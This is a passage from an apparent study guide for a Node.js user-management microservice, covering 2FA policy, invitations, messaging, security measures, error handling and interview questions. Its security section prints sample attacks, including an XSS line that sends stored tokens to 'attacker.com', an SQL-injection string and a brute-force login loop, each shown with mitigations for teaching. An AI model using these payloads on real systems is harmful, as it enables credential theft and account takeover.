  // Client users MUST use organization's 2FA
  if (user.role === 'client_user') {
    if (!user.organization) {
      throw new ValidationError('Client user must belong to an organization');
    }
    // Ignore requestedMethod entirely!
    preferredTwoFactor = user.organization.twoFactorMethod;
  } else {
    // Other roles can choose
    preferredTwoFactor = requestedMethod || user.organization?.twoFactorMethod;
  }
  
  // Don't save twoFactorMethod on client_user documents
  // They always inherit from organization
  if (user.role !== 'client_user') {
    user.twoFactorMethod = preferredTwoFactor;
    await userRepo.save(user);
  }
}
```

**Why this complexity?**

```javascript
// Scenario 1: Organization mandates TOTP
const org = { twoFactorMethod: 'totp' };

// Client Admin in this org
const admin = {
  role: 'client_admin',
  organization: org._id,
  twoFactorMethod: 'otp'  // Personal preference
};
// Result: Uses OTP (admins can choose)

// Client User in this org
const user = {
  role: 'client_user',
  organization: org._id,
  twoFactorMethod: 'otp'  // This field is IGNORED!
};
// Result: Uses TOTP (enforced by org)

// Why?
// - Organizations need control over security policies
// - Prevent users from weakening security
// - Admins have more autonomy (trusted more)
// - Consistent security posture across client users
```

---

## 📧 Invitation System

### Complete Invitation Flow

```javascript
/*
┌────────────────────────────────────────────────────────────┐
│               INVITATION WORKFLOW                          │
└────────────────────────────────────────────────────────────┘

1. Admin creates invitation
   POST /api/invites/create
   { email: "newuser@example.com", role: "client_user" }
   
2. System validations:
   ├─ Can inviter's role invite this role? (RBAC check)
   ├─ Does user already exist? (Conflict check)
   ├─ Is there pending invite? (Duplicate check)
   └─ Does role need organization? (Business rule)
   
3. Generate invite token
   ├─ crypto.randomBytes(32).toString('hex')
   └─ 64-character random string
   
4. Create invite record
   ├─ email, role, token, invitedBy, organization
   ├─ expiresAt: now + 7 days
   └─ status: 'pending'
   
5. Send notifications
   ├─ Email: "Click to accept: https://app.com/accept?token=ABC..."
   └─ RabbitMQ event: { type: 'invite.created', ... }
   
6. Invited user clicks link
   GET /api/invites/details/ABC123...
   → Returns: { email, role, invitedBy, organizationName, expiresAt }
   → Frontend shows invitation details
   
7. User fills signup form
   POST /api/invites/accept
   {
     token: "ABC123...",
     firstName: "John",
     lastName: "Doe",
     password: "SecurePass123",
     twoFactorMethod: "totp"
   }
   
8. System creates user account
   ├─ Validate invite still valid (not expired/revoked)
   ├─ Create user with hashed password
   ├─ If client_admin: Create organization
   ├─ Setup 2FA (generate TOTP secret or OTP)
   ├─ Mark invite as accepted
   └─ Emit Socket.IO event to inviter
   
9. User receives response
   ├─ If TOTP chosen: { user, totpQRCode, requiresSetup: true }
   ├─ If OTP chosen: { user, accessToken, refreshToken }
   └─ Frontend redirects appropriately
*/
```

### Edge Cases Handled

#### 1. Duplicate Invitations

```javascript
// File: userManagement/services/inviteService.js

async createInvite(inviter, email, role, organizationName) {
  // Check for existing pending invite
  const pendingInvite = await inviteRepo.findByEmailAndStatus(
    email,
    'pending'
  );
  
  if (pendingInvite) {
    return await this.handleExistingInvite(pendingInvite, inviter);
  }
  
  // No existing invite, create new one
  return await this.createNewInvite(inviter, email, role, organizationName);
}

async handleExistingInvite(invite, inviter) {
  if (invite.isExpired()) {
    // Expired invite exists → Refresh it
    const newToken = Invite.generateToken();
    invite.token = newToken;
    invite.expiresAt = Date.now() + 7 * 24 * 60 * 60 * 1000;
    invite.status = 'pending';
    await inviteRepo.save(invite);
    
    await sendInviteEmail(invite.email, newToken);
    
    return {
      message: 'Existing expired invite refreshed and re-sent',
      invite: { ...invite, token: newToken }
    };
  }
  
  // Active invite exists → Just re-send email
  await sendInviteEmail(invite.email, invite.token);
  
  return {
    message: 'Active invite already existed; invitation re-sent',
    invite
  };
}
```

**Why this approach?**

```javascript
// Scenario: Admin invites user, user loses email

// Without de-duplication:
Admin invites: user@example.com (token1)
Admin invites again: user@example.com (token2)
User has 2 pending invites ❌
Which one to use?

// With de-duplication:
Admin invites: user@example.com (token1)
Admin invites again: Same email re-sent with token1 ✅
User has 1 invite, clear UX

// Expired invite scenario:
Admin invites: user@example.com (token1, expired)
Admin invites again: token1 refreshed, new expiry ✅
Old links still work (same token)
```

#### 2. Client Admin + Organization Creation

```javascript
async acceptInvite(token, firstName, lastName, password, twoFactorMethod) {
  const invite = await inviteRepo.findByToken(token);
  
  // Special case: client_admin with organizationName
  if (invite.role === 'client_admin' && invite.organizationName) {
    return await this.createAdminWithOrganization(invite, ...);
  }
  
  // Regular case
  return await this.createRegularUser(invite, ...);
}

async createAdminWithOrganization(invite, firstName, lastName, password) {
  // 1. Generate URL-friendly slug
  const slug = invite.organizationName
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')  // Replace non-alphanumeric with -
    .replace(/^-|-$/g, '');        // Remove leading/trailing -
  
  // "Acme Corporation!" → "acme-corporation"
  
  // 2. Check slug uniqueness
  const existingOrg = await organizationRepo.findBySlug(slug);
  if (existingOrg) {
    throw new ConflictError('Organization with this name already exists');
  }
  
  // 3. Create user first
  const user = await userRepo.create({
    email: invite.email,
    password,
    firstName,
    lastName,
    role: 'client_admin',
    invitedBy: invite.invitedBy
    // No organization yet!
  });
  
  // 4. Create organization
  const organization = await organizationRepo.create({
    name: invite.organizationName,
    slug,
    adminUser: user._id,
    twoFactorMethod: 'otp'  // Default
  });
  
  // 5. Link user to organization
  await userRepo.updateById(user._id, {
    organization: organization._id
  });
  
  // 6. Return updated user
  return await userRepo.findById(user._id, {
    populate: 'organization'
  });
}
```

**Q: Why create user before organization?**

```javascript
// Problem: Chicken and egg

// Approach 1: Organization first
const org = await Organization.create({
  adminUser: ???  // Don't have user ID yet!
});

// Approach 2: User first
const user = await User.create({
  organization: null  // Set later
});
const org = await Organization.create({
  adminUser: user._id  // Now we have it!
});
await User.updateById(user._id, {
  organization: org._id
});

// Could use transactions for atomicity:
await withTransaction(async (session) => {
  const user = await User.create([{ ... }], { session });
  const org = await Organization.create([{
    adminUser: user[0]._id
  }], { session });
  await User.updateById(user[0]._id, {
    organization: org[0]._id
  }, { session });
});
// All or nothing - if anything fails, rollback
```

#### 3. Invitation Expiry & Status

```javascript
// File: userManagement/models/Invite.js

inviteSchema.methods.isExpired = function() {
  return Date.now() > this.expiresAt;
};

inviteSchema.methods.isValid = function() {
  return this.status === 'pending' && !this.isExpired();
};

// Usage:
const invite = await Invite.findOne({ token });

if (!invite.isValid()) {
  await inviteRepo.markAsExpired(invite._id);
  throw new ValidationError('Invite has expired or is no longer valid');
}

// Why separate isExpired and status?
// - isExpired: Time-based (computed)
// - status: State-based (stored)

// States:
// - pending: Created, not yet accepted
// - accepted: User created account
// - expired: Past expiresAt date
// - revoked: Admin cancelled invite
```

---

## 🔄 Microservices Communication

### Communication Patterns

```
┌─────────────────────────────────────────────────────────┐
│                    User Management                      │
│                     (Port 3000)                         │
└───────────┬───────────────────┬─────────────────────────┘
            │                   │
            │                   │
     ┌──────▼──────┐     ┌──────▼──────┐
     │ HTTP Client │     │  RabbitMQ   │
     │   (Axios)   │     │  Publisher  │
     └──────┬──────┘     └──────┬──────┘
            │                   │
            │ Synchronous       │ Asynchronous
            │ Request/Response  │ Fire-and-forget
            │                   │
            ▼                   ▼
┌─────────────────────────────────────────────────────────┐
│                  Notifications Service                   │
│                      (Port 4000)                         │
│  ┌──────────────┐              ┌─────────────┐         │
│  │ HTTP Server  │              │  RabbitMQ   │         │
│  │  (Express)   │              │  Consumer   │         │
│  └──────────────┘              └─────────────┘         │
└─────────────────────────────────────────────────────────┘
```

### 1. HTTP Communication (Synchronous)

```javascript
// File: userManagement/utils/notificationClient.js

const NOTIFICATION_SERVICE_URL = 
  process.env.NOTIFICATION_SERVICE_URL || 'http://localhost:4000';

export const sendEmail = async (to, subject, html) => {
  try {
    await axios.post(`${NOTIFICATION_SERVICE_URL}/api/email/send`, {
      to,
      subject,
      html
    });
    logger.debug('Email sent successfully', { to, subject });
  } catch (error) {
    logger.error('Failed to send email', {
      error: error.message,
      to,
      subject
    });
    throw new Error('Email delivery failed');
  }
};

// Usage:
await sendInviteEmail(email, token, inviterName, role);
// Waits for response before continuing
```

**When to use HTTP:**
- ✅ Need immediate result (success/failure)
- ✅ Synchronous operation (send OTP, wait for delivery)
- ✅ Simple request/response
- ❌ High volume (can overwhelm service)
- ❌ Don't need guaranteed delivery

### 2. RabbitMQ Communication (Asynchronous)

```javascript
// File: userManagement/utils/rabbitmq.js

export const publishEvent = async (exchange, routingKey, message) => {
  if (!channel) {
    logger.warn('RabbitMQ not initialized, skipping event');
    return false;
  }
  
  try {
    // 1. Ensure exchange exists
    await channel.assertExchange(exchange, 'topic', {
      durable: true  // Survives broker restart
    });
    
    // 2. Convert message to buffer
    const payload = Buffer.from(JSON.stringify(message));
    
    // 3. Publish with confirmation
    return new Promise((resolve, reject) => {
      channel.publish(
        exchange,
        routingKey,
        payload,
        {
          contentType: 'application/json',
          persistent: true  // Survives broker restart
        },
        (err) => {
          if (err) {
            logger.error('RabbitMQ publish failed', { error: err.message });
            return reject(err);
          }
          logger.debug('RabbitMQ event published', { exchange, routingKey });
          resolve(true);
        }
      );
    });
  } catch (error) {
    logger.error('RabbitMQ publish error', { error: error.message });
    throw error;
  }
};

// Usage:
await publishEvent(
  'events',                    // Exchange name
  'user.invite.created',       // Routing key
  {
    to: email,
    subject: 'You have been invited',
    html: inviteEmailHTML
  }
);
// Doesn't wait for consumption, returns immediately
```

**RabbitMQ Concepts:**

```javascript
// 1. Exchange: Routes messages to queues
// 2. Routing Key: Determines which queue(s) receive message
// 3. Queue: Stores messages until consumed
// 4. Consumer: Processes messages from queue

/*
Publisher                 Exchange              Queue           Consumer
(User Mgmt)              (events)                             (Notifications)
    │                       │                     │                 │
    │  user.invite.created  │                     │                 │
    ├──────────────────────►│                     │                 │
    │                       │  user.invite.*      │                 │
    │                       ├────────────────────►│                 │
    │                       │                     │  Get message    │
    │                       │                     ├────────────────►│
    │                       │                     │                 │
    │                       │                     │  Process email  │
    │                       │                     │ ◄───────────────┤
    │                       │                     │                 │
    │                       │                     │  ACK (done)     │
    │                       │                     │◄────────────────┤
    │                       │                     │                 │
*/

// Topic Exchange Routing:
'user.invite.created'    → Matches: 'user.invite.*', 'user.*', '#'
'user.password.reset'    → Matches: 'user.password.*', 'user.*', '#'
'email.*.sent'           → Matches: 'email.*.sent', '*.*.sent', '#'

// Wildcards:
// * = exactly one word
// # = zero or more words
```

**When to use RabbitMQ:**
- ✅ Fire-and-forget (don't need immediate response)
- ✅ Multiple consumers (fan-out pattern)
- ✅ Guaranteed delivery (persistent messages)
- ✅ Load balancing across consumers
- ✅ Retry logic and dead-letter queues
- ❌ Need synchronous response
- ❌ Simple one-to-one communication

### 3. Socket.IO Communication (Real-time)

```javascript
// File: userManagement/utils/socketClient.js

let socket = null;

export const initSocketClient = () => {
  const SOCKET_URL = process.env.SOCKET_URL || 'http://localhost:4000';
  
  socket = io(SOCKET_URL, {
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: Infinity
  });
  
  socket.on('connect', () => {
    logger.info('Socket.IO connected', { socketId: socket.id });
  });
  
  socket.on('disconnect', () => {
    logger.warn('Socket.IO disconnected');
  });
};

export const emitInviteAccepted = (inviterId, email, role) => {
  if (!socket || !socket.connected) {
    logger.warn('Socket.IO not connected, cannot emit event');
    return;
  }
  
  socket.emit('invite_accepted', {
    recipientId: inviterId,
    data: {
      email,
      role,
      timestamp: new Date().toISOString()
    }
  });
  
  logger.debug('Emitted invite_accepted event', { inviterId, email });
};

// Usage:
await inviteService.acceptInvite(...);
emitInviteAccepted(user.invitedBy, user.email, user.role);
// Inviter sees real-time notification: "user@example.com accepted your invite!"
```

**Socket.IO vs RabbitMQ:**

| Feature | Socket.IO | RabbitMQ |
|---------|-----------|----------|
| **Purpose** | Real-time client updates | Service-to-service messaging |
| **Direction** | Server → Browser | Service → Service |
| **Delivery** | Best effort | Guaranteed |
| **Persistence** | No | Yes (durable queues) |
| **Use Case** | Live notifications | Background jobs |

### Communication Flow Example: Sending Invite

```javascript
// When admin creates invite, THREE communications happen:

// 1. HTTP (Synchronous) - Critical path
try {
  await sendInviteEmail(email, token, inviterName, role);
  // SUCCESS: Email sent, continue
  // FAILURE: Throw error, invite creation fails
} catch (error) {
  throw new Error('Email delivery failed');
}

// 2. RabbitMQ (Asynchronous) - Non-critical
try {
  await publishEvent('events', 'user.invite.created', {...});
  // SUCCESS or FAILURE: Log and continue
} catch (error) {
  logger.warn('RabbitMQ publish failed', { error: error.message });
  // Don't fail the request
}

// 3. Socket.IO (Real-time) - Non-critical
try {
  emitInviteCreated(inviter._id, email);
  // SUCCESS or FAILURE: Log and continue
} catch (error) {
  logger.warn('Socket emit failed', { error: error.message });
  // Don't fail the request
}

// Why different error handling?
// - HTTP: User waiting for response, failure = bad UX
// - RabbitMQ: Background system, log and move on
// - Socket.IO: Nice-to-have feature, not essential
```

---

## 🛡️ Security Implementations

### 1. Password Security

```javascript
// NEVER store plain text passwords!

// File: userManagement/models/User.js

userSchema.pre('save', async function(next) {
  // Only hash if password was modified
  if (!this.isModified('password')) return next();
  
  // Generate salt (random data)
  const salt = await bcrypt.genSalt(12);
  // 12 rounds = 2^12 = 4096 iterations
  // Each iteration doubles the time
  
  // Hash password with salt
  this.password = await bcrypt.hash(this.password, salt);
  // Input:  "mypassword123"
  // Output: "$2a$12$KIXxBj9hqz6pVQCqJQfXy.n6..."
  
  next();
});

// Verification
userSchema.methods.comparePassword = async function(candidatePassword) {
  return await bcrypt.compare(candidatePassword, this.password);
  // Extracts salt from stored hash, re-hashes candidate, compares
};
```

**Why bcrypt?**

```javascript
// Comparison of hashing algorithms:

// 1. MD5/SHA-1 (❌ NEVER USE)
// - Fast (can hash billions per second)
// - GPUs can crack quickly
// - Rainbow tables exist

// 2. SHA-256 (❌ NOT FOR PASSWORDS)
// - Still too fast for passwords
// - Designed for data integrity, not passwords

// 3. bcrypt (✅ GOOD)
// - Intentionally slow
// - Adaptive (can increase rounds over time)
// - Includes salt automatically
// - Resistant to GPU/ASIC attacks

// 4. Argon2 (✅ BETTER)
// - Winner of Password Hashing Competition
// - Memory-hard (resistant to specialized hardware)
// - bcrypt is still acceptable for most apps

// Cost of bcrypt rounds:
const times = {
  10: '65ms',
  11: '129ms',
  12: '258ms',   // ← We use this
  13: '515ms',
  14: '1.03s',
  15: '2.06s'
};

// Choosing 12:
// - Fast enough for UX (~250ms)
// - Slow enough for security (250ms × 1B attempts = 8 years)
```

### 2. JWT Security

```javascript
// File: userManagement/utils/jwt.js

export const generateAccessToken = (user) => {
  const payload = {
    userId: user._id,
    email: user.email,
    role: user.role,
    organizationId: user.organization || null
  };
  
  return jwt.sign(
    payload,
    process.env.JWT_ACCESS_SECRET,  // ← Must be strong secret!
    { expiresIn: '15m' }
  );
};

// Common mistakes:

// ❌ DON'T: Store sensitive data in JWT
const payload = {
  userId: user._id,
  password: user.password,        // ❌ JWTs are base64 encoded, not encrypted!
  creditCard: user.creditCard     // ❌ Anyone can decode this!
};

// ✅ DO: Only store identifiers
const payload = {
  userId: user._id,    // ✅ Not sensitive
  role: user.role,     // ✅ Public info
  email: user.email    // ✅ Already known
};

// ❌ DON'T: Use weak secret
const secret = "secret123";  // ❌ Easily guessed

// ✅ DO: Use strong random secret
const secret = crypto.randomBytes(64).toString('hex');
// ✅ Store in environment variable
// Example: c9f3d4e2a1b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0...
```

**JWT Attack Scenarios:**

```javascript
// Attack 1: Algorithm Confusion
// Attacker changes header from HS256 to "none"
{
  "alg": "none",
  "typ": "JWT"
}
// Sends unsigned token
// Mitigation: Always specify algorithm in verify()
jwt.verify(token, secret, { algorithms: ['HS256'] });

// Attack 2: Secret Brute Force
// Attacker tries common secrets
secrets = ["secret", "password", "12345", ...]
// Mitigation: Use long random secret (64+ bytes)

// Attack 3: Token Replay
// Attacker steals valid token, uses it elsewhere
// Mitigation: 
// - Short expiry (15min)
// - HTTPS only
// - Bind to IP/User-Agent (optional)

// Attack 4: XSS Token Theft
// Attacker injects script, steals token from localStorage
<script>
  fetch('attacker.com/steal?token=' + localStorage.accessToken);
</script>
// Mitigation:
// - httpOnly cookies (can't access from JS)
// - Content Security Policy headers
// - Input sanitization
```

### 3. Rate Limiting

```javascript
// File: userManagement/server.js

import rateLimit from 'express-rate-limit';

// General API rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requests per window
  message: 'Too many requests from this IP, please try again later.'
});

app.use('/api/', limiter);

// Stricter limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 50,                    // 50 requests per window
  skipSuccessfulRequests: true,  // Only count failures
  message: 'Too many login attempts, please try again later.'
});

app.use('/api/auth/login', authLimiter);

// Why rate limit?
// 1. Prevent brute force attacks
// 2. Prevent DoS (Denial of Service)
// 3. Prevent resource exhaustion
// 4. Fair usage across users

// Attack scenario without rate limiting:
for (let password of commonPasswords) {
  await fetch('/api/auth/login', {
    body: JSON.stringify({ email: 'target@example.com', password })
  });
  // Can try millions of passwords
}

// With rate limiting:
// After 50 failed attempts in 15min → Blocked
// Attacker must wait, making brute force impractical
```

### 4. Input Validation & Sanitization

```javascript
// File: userManagement/middleware/validation.js

import { body, validationResult } from 'express-validator';

export const createInviteValidation = [
  body('email')
    .isEmail()                           // Must be valid email format
    .normalizeEmail()                    // Converts to lowercase, trims
    .withMessage('Invalid email address'),
  
  body('role')
    .isIn(['site_admin', 'operator', 'client_admin', 'client_user'])
    .withMessage('Invalid role'),
  
  body('organizationName')
    .optional()
    .trim()                              // Remove whitespace
    .isLength({ min: 2, max: 100 })
    .withMessage('Organization name must be 2-100 characters'),
  
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array()
      });
    }
    next();
  }
];

// Why validate?

// Attack 1: SQL Injection (not applicable to MongoDB, but similar NoSQL injection)
// Input: { email: "user'; DROP TABLE users; --" }
// Without validation: Could execute malicious queries
// With validation: Rejected as invalid email format

// Attack 2: XSS (Cross-Site Scripting)
// Input: { firstName: "<script>alert('XSS')</script>" }
// Without sanitization: Stored in DB, executed when rendered
// With sanitization: HTML entities escaped or stripped

// Attack 3: Buffer Overflow
// Input: { organizationName: "A".repeat(1000000) }
// Without validation: Could crash server or exhaust memory
// With validation: Rejected (max 100 characters)

// Defense in depth:
// 1. Validate input (reject bad data)
// 2. Sanitize input (clean suspicious data)
// 3. Escape output (prevent XSS when rendering)
// 4. Parameterize queries (prevent injection)
```

### 5. CORS Configuration

```javascript
// File: userManagement/server.js

app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',
  credentials: true
}));

// What is CORS?
// Cross-Origin Resource Sharing
// Browser security feature that restricts cross-origin requests

// Without CORS:
// Frontend (http://localhost:3001) can't call API (http://localhost:3000)
// Browser blocks the request

// With CORS configured:
// API says: "I allow requests from http://localhost:3001"
// Browser permits the request

// Security consideration:
// ❌ DON'T: Allow all origins in production
app.use(cors({ origin: '*' }));
// Allows any website to call your API

// ✅ DO: Whitelist specific origins
app.use(cors({
  origin: 'https://myapp.com',
  credentials: true  // Allow cookies/auth headers
}));

// ✅ DO: Use environment variable
app.use(cors({
  origin: process.env.CORS_ORIGIN,  // Different per environment
  credentials: true
}));
```

### 6. Helmet (Security Headers)

```javascript
// File: userManagement/server.js

import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: false  // Disabled for Swagger UI
}));

// What does helmet do?
// Sets various HTTP headers for security

// Headers it sets:
{
  "X-DNS-Prefetch-Control": "off",               // Prevent DNS prefetching
  "X-Frame-Options": "SAMEORIGIN",               // Prevent clickjacking
  "X-Content-Type-Options": "nosniff",           // Prevent MIME sniffing
  "X-XSS-Protection": "1; mode=block",           // Enable XSS filter
  "Strict-Transport-Security": "max-age=15552000" // Force HTTPS
}

// Attack prevention:

// 1. Clickjacking
// Attacker embeds your site in iframe, tricks user into clicking
// X-Frame-Options: SAMEORIGIN prevents this

// 2. MIME Sniffing
// Browser guesses file type, executes malicious JS
// X-Content-Type-Options: nosniff forces declared type

// 3. XSS
// Attacker injects malicious script
// CSP header restricts what scripts can run

// Production setup:
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  }
}));
```

---

## ⚠️ Error Handling Strategy

### Custom Error Classes

```javascript
// File: userManagement/utils/errors.js

// Base error class
export class AppError extends Error {
  constructor(message, statusCode = 500, isOperational = true) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = isOperational;
    this.status = `${statusCode}`.startsWith('4') ? 'fail' : 'error';
    Error.captureStackTrace(this, this.constructor);
  }
}

// Specific error types
export class ValidationError extends AppError {
  constructor(message = 'Validation failed') {
    super(message, 400);  // Bad Request
  }
}

export class AuthenticationError extends AppError {
  constructor(message = 'Authentication failed') {
    super(message, 401);  // Unauthorized
  }
}

export class AuthorizationError extends AppError {
  constructor(message = 'Insufficient permissions') {
    super(message, 403);  // Forbidden
  }
}

export class NotFoundError extends AppError {
  constructor(message = 'Resource not found') {
    super(message, 404);  // Not Found
  }
}

export class ConflictError extends AppError {
  constructor(message = 'Resource already exists') {
    super(message, 409);  // Conflict
  }
}
```

**Why custom errors?**

```javascript
// Without custom errors:
if (!user) {
  throw new Error('User not found');
}
// Problem: No status code info, controller doesn't know how to respond

// With custom errors:
if (!user) {
  throw new NotFoundError('User not found');
}
// Error has statusCode=404, controller knows to return 404

// Controller error handling:
try {
  const result = await inviteService.createInvite(...);
  return created(res, result);
} catch (error) {
  // Check error type
  if (error.statusCode === 403) {
    return forbidden(res, error.message);
  }
  if (error.statusCode === 400) {
    return badRequest(res, error.message);
  }
  // Unknown error
  return serverError(res);
}
```

### Error Handling Flow

```javascript
// 1. Service throws specific error
async createInvite(inviter, email, role) {
  if (!canInviteRole(inviter.role, role)) {
    throw new AuthorizationError(`Cannot invite role: ${role}`);
  }
  
  const existingUser = await userRepo.findByEmail(email);
  if (existingUser) {
    throw new ConflictError('User with this email already exists');
  }
  
  // ... create invite
}

// 2. Controller catches and responds
try {
  const result = await inviteService.createInvite(...);
  return created(res, result);
} catch (error) {
  logger.error('Create invite error', {
    error: error.message,
    inviterId: req.user._id
  });
  
  // Match error type to response
  if (error.statusCode === 403) {
    return forbidden(res, error.message);
  }
  if (error.statusCode === 409) {
    return badRequest(res, error.message);
  }
  return serverError(res);
}

// 3. Response helpers
export const forbidden = (res, message) => {
  return res.status(403).json({
    success: false,
    message
  });
};

export const badRequest = (res, message) => {
  return res.status(400).json({
    success: false,
    message
  });
};

export const serverError = (res, message = 'Internal server error') => {
  return res.status(500).json({
    success: false,
    message
  });
};
```

### Global Error Handler

```javascript
// File: userManagement/server.js

// Catch-all error handler (last middleware)
app.use((err, req, res, next) => {
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method
  });
  
  // Don't leak error details in production
  const message = process.env.NODE_ENV === 'production'
    ? 'Internal server error'
    : err.message;
  
  res.status(err.status || 500).json({
    success: false,
    message
  });
});

// Why global handler?
// - Catches errors that slip through try/catch
// - Prevents server crash
// - Logs for debugging
// - Consistent error format
```

### Operational vs Programmer Errors

```javascript
// Operational Errors (Expected, recoverable)
// - User not found
// - Invalid input
// - Network timeout
// - Database connection failed

// Programmer Errors (Unexpected, bugs)
// - Cannot read property of undefined
// - Stack overflow
// - Invalid function arguments

// How to handle:

// Operational error:
try {
  const user = await userRepo.findById(userId);
  if (!user) {
    throw new NotFoundError('User not found');  // Expected
  }
} catch (error) {
  if (error.isOperational) {
    // Gracefully handle
    return res.status(error.statusCode).json({
      success: false,
      message: error.message
    });
  }
  // Programmer error - log and alert
  logger.error('Unexpected error', { error: error.stack });
  // In production: Restart server, alert ops team
}
```

---

## 🗄️ Repository Pattern

### What is Repository Pattern?

```
Service Layer (Business Logic)
       │
       │ Uses abstract interface
       │
       ▼
Repository Layer (Data Access)
       │
       │ Talks to database
       │
       ▼
Database (MongoDB)
```

**Benefits:**
1. **Abstraction**: Service doesn't know about database implementation
2. **Testability**: Can mock repositories in tests
3. **Maintainability**: Change database without changing services
4. **Reusability**: Same queries used across services

### Generic Repository Functions

```javascript
// File: userManagement/database/repository.js

// Generic CRUD operations

export const findOne = async (Model, query, options = {}) => {
  let queryBuilder = Model.findOne(query);
  
  if (options.populate) {
    queryBuilder = queryBuilder.populate(options.populate);
  }
  if (options.select) {
    queryBuilder = queryBuilder.select(options.select);
  }
  if (options.lean) {
    queryBuilder = queryBuilder.lean();  // Return plain JS object
  }
  
  return await queryBuilder.exec();
};

export const findById = async (Model, id, options = {}) => {
  let queryBuilder = Model.findById(id);
  
  // Apply options (populate, select, lean)
  // ... same as above
  
  return await queryBuilder.exec();
};

export const create = async (Model, data) => {
  return await Model.create(data);
};

export const updateOne = async (Model, query, updates, options = {}) => {
  return await Model.findOneAndUpdate(query, updates, {
    new: true,           // Return updated document
    runValidators: true, // Run schema validations
    ...options
  });
};

export const deleteOne = async (Model, query) => {
  return await Model.findOneAndDelete(query);
};

// Why generic functions?
// - DRY (Don't Repeat Yourself)
// - Consistent query building
// - Easy to add features (caching, logging, etc.)
```

### Model-Specific Repositories

```javascript
// File: userManagement/database/repositories/userRepository.js

import User from '../../models/User.js';
import * as db from '../repository.js';

export class UserRepository {
  // Use generic functions
  async findById(id, options = {}) {
    return await db.findById(User, id, options);
  }
  
  async findByEmail(email, options = {}) {
    return await db.findOne(User, { email }, options);
  }
  
  // Custom business logic
  async updateOTP(userId, otpHash, otpExpiry) {
    return await db.updateById(User, userId, {
      otpHash,
      otpExpiry
    });
  }
  
  async clearOTP(userId) {
    return await db.updateById(User, userId, {
      otpHash: null,
      otpExpiry: null
    });
  }
  
  async findByOrganization(organizationId, filters = {}) {
    return await db.find(User, {
      organization: organizationId,
      ...filters
    });
  }
}

export default new UserRepository();
```

**Why separate repositories?**

```javascript
// Bad: Service talks directly to database
async createInvite(email) {
  const user = await User.findOne({ email });  // ❌ Tight coupling
  if (user) throw new Error('User exists');
  // ...
}

// Good: Service uses repository
async createInvite(email) {
  const user = await userRepo.findByEmail(email);  // ✅ Abstraction
  if (user) throw new Error('User exists');
  // ...
}

// Benefits:
// 1. Can change User.findOne implementation without changing services
// 2. Can add caching in repository layer
// 3. Can mock userRepo in tests
// 4. Query logic centralized (reusable)
```

### Population (Joining Documents)

```javascript
// MongoDB is NoSQL (no joins), but has "populate" (similar to joins in SQL)

// Example: Get invite with user details
const invite = await inviteRepo.findByToken(token, {
  populate: [
    { path: 'invitedBy', select: 'firstName lastName email' },
    { path: 'organization', select: 'name' }
  ]
});

// Result:
{
  _id: "...",
  email: "user@example.com",
  role: "client_user",
  invitedBy: {                    // Populated!
    _id: "...",
    firstName: "John",
    lastName: "Doe",
    email: "john@example.com"
  },
  organization: {                  // Populated!
    _id: "...",
    name: "Acme Corp"
  }
}

// Why use populate?
// - Avoid manual fetching
// - Get related data in one query
// - Similar to SQL JOIN
```

**Lean vs Full Documents:**

```javascript
// Full document (Mongoose document)
const user = await userRepo.findById(userId);
user.firstName = "New Name";
await user.save();  // ✅ Can save

// Lean document (Plain JavaScript object)
const user = await userRepo.findById(userId, { lean: true });
user.firstName = "New Name";
await user.save();  // ❌ Error! No save() method

// When to use lean?
// - Read-only operations (faster, less memory)
// - API responses
// - When you don't need Mongoose methods
```

---

## ❓ Common Interview Questions & Answers

### Q1: Why do we create a new refresh token every time we refresh the access token?

**Answer:**

This is called **Refresh Token Rotation**, a security best practice defined in OAuth 2.0 BCP (Best Current Practice).

**Reasons:**

1. **Limits Token Lifespan**: Even though refresh tokens have a 7-day expiry, they're only valid for ONE use. Each refresh generates a new token.

2. **Detects Token Theft**: If an attacker steals a refresh token and uses it, when the legitimate user tries to use the same token, it's already revoked. This signals a potential security breach.

3. **Audit Trail**: The `replacedBy` field creates a chain of tokens, helping track suspicious activity:
   ```javascript
   // Token chain in database:
   Token A (revoked, replacedBy: Token B)
     → Token B (revoked, replacedBy: Token C)
       → Token C (active)
   ```

4. **Reduces Attack Window**: If compromised, token can only be used once before becoming invalid.

**Trade-offs:**
- ✅ High security (recommended)
- ⚠️ More database writes
- ✅ Better breach detection

**Alternative (not recommended):**
- Reuse the same refresh token until expiry
- Less secure but fewer DB operations
- Suitable only for low-risk applications

---

### Q2: Why use a random token for invitations instead of the database ID?

**Answer:**

**Security reasons:**

1. **Unpredictable**: Random 64-character hex string (256 bits of entropy)
   - Database ID: Sequential and predictable
   - Token: Completely random

2. **Prevents Enumeration**: 
   ```javascript
   // With Database ID (BAD):
   GET /invites/details/507f1f77bcf86cd799439011  // Try next ID
   GET /invites/details/507f1f77bcf86cd799439012  // Enumerate all!
   
   // With Random Token (GOOD):
   GET /invites/details/a3f5e2b8c9d1f4e6a7b3c8d9e1f2a3b4...
   // Can't guess other tokens!
   ```

3. **Collision Protection**:
   - Probability of duplicate: ~0% (need 10^38 invites for 1% chance)
   - MongoDB unique constraint prevents duplicates anyway

4. **Public Access**: Invite details endpoint doesn't require authentication (user doesn't have account yet), so token acts as proof of possession.

---

### Q3: Explain the difference between `authenticate` and `authorize` middleware.

**Answer:**

**Authentication** = "Who are you?"  
**Authorization** = "What are you allowed to do?"

```javascript
// authenticate: Verify identity from JWT
export const authenticate = async (req, res, next) => {
  const token = req.headers.authorization?.substring(7);
  const decoded = verifyAccessToken(token);  // Verify JWT
  const user = await userRepo.findById(decoded.userId);
  req.user = user;  // Add user to request
  next();
};

// authorize: Check if user has required role
export const authorize = (...allowedRoles) => {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.role)) {
